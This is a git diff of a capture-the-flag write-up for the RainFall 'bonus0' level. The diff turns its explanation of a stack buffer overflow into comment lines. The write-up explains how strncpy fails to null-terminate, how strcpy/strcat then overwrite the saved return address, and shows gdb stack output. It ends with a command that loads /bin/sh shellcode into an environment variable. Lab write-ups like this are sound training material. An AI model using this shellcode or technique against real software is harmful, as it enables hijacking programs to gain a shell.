@@ -1,12 +1,12 @@
-This is a buffer overflow exploit.
+# This is a buffer overflow exploit.
 
-There is a couple of bugs that lead to it.
-The function p ends by a call to strnpcy that copies 20 bytes of the local
-buffer into the target buffer passed as an argument to p.
-If the argument passed to p is the address of a buffer of 20 or less bytes,
-strncpy won't have enough space to put a terminating null byte.
+# There is a couple of bugs that lead to it.
+# The function p ends by a call to strnpcy that copies 20 bytes of the local
+# buffer into the target buffer passed as an argument to p.
+# If the argument passed to p is the address of a buffer of 20 or less bytes,
+# strncpy won't have enough space to put a terminating null byte.
 
-It's the case for both buffers in pp. They both are exactly 20 bytes long.
+# It's the case for both buffers in pp. They both are exactly 20 bytes long.
 
 ... pp(char *b0){
 	char b1[20]; <==
@@ -18,15 +18,15 @@ It's the case for both buffers in pp. They both are exactly 20 bytes long.
 	...
 }
 
-Keeping in mind the lack of terminating null byte in b1, we can deduce that the
-call to strcpy() will copy the contents of both buffers, since they are
-contiguous in memory, until a null byte is found on the stack.
+# Keeping in mind the lack of terminating null byte in b1, we can deduce that
+# the call to strcpy() will copy the contents of both buffers, since they are
+# contiguous in memory, until a null byte is found on the stack.
 
-Therefore it is possible to copy at least 60 bytes into the buffer contained in
-the main function, thus leading to an overflow and enabling us to overwrite the
-return address contained in the main stack frame.
+#Therefore it is possible to copy at least 60 bytes into the buffer contained in
+#the main function, thus leading to an overflow and enabling us to overwrite the
+#return address contained in the main stack frame.
 
-Here is the state of the stack after imputing two test strings :
+#Here is the state of the stack after imputing two test strings :
 
 (gdb) r
 The program being debugged has been started already.
@@ -58,24 +58,24 @@ Stack level 0, frame at 0xbffff710:
  Saved registers:
   ebp at 0xbffff708, eip at 0xbffff70c
 
-As we can see, we need to input 9 bytes before reaching the location of the
-saved eip on the stack.
-There are 5 extra bytes that aren't present in the initial input strings.
-These were copied by strcpy() since no '\0' was found up to that point.
-The call to strcat() starts copying characters at address 0xbffff703 and onwards.
+# As we can see, we need to input 9 bytes before reaching the location of the
+# saved eip on the stack.
+# There are 5 extra bytes that aren't present in the initial input strings.
+# These were copied by strcpy() since no '\0' was found up to that point.
+# The call to strcat() starts copying characters at address 0xbffff703.
 
-There is a problem in building the payload though, there are two calls to read()
-in the program, which makes it trickier to build.
+# There is a problem in building the payload though, there are two calls to
+# read() in the program, which makes it trickier to build.
 
-The solution is to send enough padding characters in our payload so that two
-calls to read() are necessary to get to the relevant data.
+# The solution is to send enough padding characters in our payload so that two
+# calls to read() are necessary to get to the relevant data.
 
-The program expects a '\n' inside the read buffer otherwise it crashes.
-There is no need to put it twice because the second call to read() overwrites
-the content of the buffer.
+# The program expects a '\n' inside the read buffer otherwise it crashes.
+# There is no need to put it twice because the second call to read() overwrites
+# the content of the buffer.
 
-Lastly, we need to put some shellcode in the environment and then print the 
-variable's address on stdout using a C helper program.
+# Lastly, we need to put some shellcode in the environment and then print the 
+# variable's address on stdout using a C helper program :
 
 bonus0@RainFall:~$ export SHELLCODE=`python -c "print '\x90' * 50 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"`
 
